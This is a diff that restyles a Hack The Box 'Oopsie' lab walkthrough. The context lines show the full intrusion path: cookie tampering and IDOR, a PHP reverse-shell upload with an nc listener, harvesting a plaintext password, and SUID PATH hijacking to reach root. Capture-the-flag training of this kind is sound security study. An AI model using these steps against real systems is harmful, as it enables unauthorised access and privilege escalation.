@@ -1,15 +1,15 @@
 
 # Oopsie — HTB Walkthrough
 
-## 🧭 Introduction
+## Introduction
 
 This machine showcases how minor vulnerabilities like Information Disclosure and Broken Access Control can be chained together to achieve full compromise — from web access to root shell.
 
 ---
 
-## 🔍 Enumeration
+## Enumeration
 
-### 🔎 Step 1: Scan open ports
+### Step 1: Scan open ports
 ```bash
 nmap -sC -sV {TARGET_IP}
 ```
@@ -19,7 +19,7 @@ This runs default scripts (`-sC`) and attempts service version detection (`-sV`)
 
 ---
 
-## 🌐 Web Enumeration
+## Web Enumeration
 
 ### Access the site in browser:
 We see an automotive site. The homepage mentions a login system. Let's use Burp Suite to spider hidden routes.
@@ -35,7 +35,7 @@ We discover `/cdn-cgi/login`, which isn’t linked directly on the homepage.
 
 ---
 
-## 🔐 Authentication Bypass
+## Authentication Bypass
 
 ### Visit `/cdn-cgi/login`:
 You’re presented with a login form. Try default creds → fail.
@@ -44,7 +44,7 @@ Select “Login as Guest” → now logged in as `guest`. Limited access — but
 
 ---
 
-## 🍪 Cookie Tampering
+## Cookie Tampering
 
 In Firefox:
 - Right-click → Inspect → Storage → Cookies
@@ -59,7 +59,7 @@ We suspect role and user ID control access.
 
 ### Test for IDOR:
 Visit:
-```
+```text
 http://{IP}/cdn-cgi/login/admin.php?content=accounts&id=1
 ```
 We get details of a different user — **Information Disclosure via Insecure Direct Object Reference (IDOR)**!
@@ -76,7 +76,7 @@ Refresh page → Now we can access **Uploads**!
 
 ---
 
-## 🐚 Upload Reverse Shell
+## Upload Reverse Shell
 
 Use built-in reverse shell:
 ```bash
@@ -91,13 +91,13 @@ $port = 1234;
 
 Upload file through the admin panel.
 
-### 🛣 Brute-force upload location:
+### Brute-force upload location:
 ```bash
 gobuster dir --url http://{TARGET_IP}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
 ```
 
 Found:
-```
+```text
 /uploads
 ```
 
@@ -111,7 +111,7 @@ Set up listener:
 nc -lvnp 1234
 ```
 
-Reverse shell established! 🎉
+Reverse shell established! 
 
 ### Stabilize shell:
 ```bash
@@ -120,7 +120,7 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 ---
 
-## 📁 Local Enumeration
+## Local Enumeration
 
 ### Search for credentials:
 ```bash
@@ -129,7 +129,7 @@ cat * | grep -i passw
 ```
 
 Result:
-```
+```text
 Password found: MEGACORP_4dm1n!!
 ```
 
@@ -154,7 +154,7 @@ cat ~/user.txt
 
 ---
 
-## ⬆️ Privilege Escalation
+## Privilege Escalation
 
 ### Check group membership:
 ```bash
@@ -189,11 +189,11 @@ file /usr/bin/bugtracker
 
 It expects a filename to read with `cat`.
 
-🧠 Hypothesis: It’s running `cat <filename>` without full path → we can hijack it via PATH.
+ Hypothesis: It’s running `cat <filename>` without full path → we can hijack it via PATH.
 
 ---
 
-## 🧨 Exploit SUID Path Hijack
+## Exploit SUID Path Hijack
 
 ### Prepare fake `cat`:
 ```bash
@@ -221,7 +221,7 @@ cat /root/root.txt
 
 ---
 
-## 🎉 Summary
+## Summary
 
 **Exploitation Flow**:
 1. Nmap + Web Spidering → Discover Hidden Login
@@ -232,7 +232,7 @@ cat /root/root.txt
 
 ---
 
-## 🔚 Mission Accomplished!
+## Mission Accomplished!
 
 ```plaintext
 USER: robert
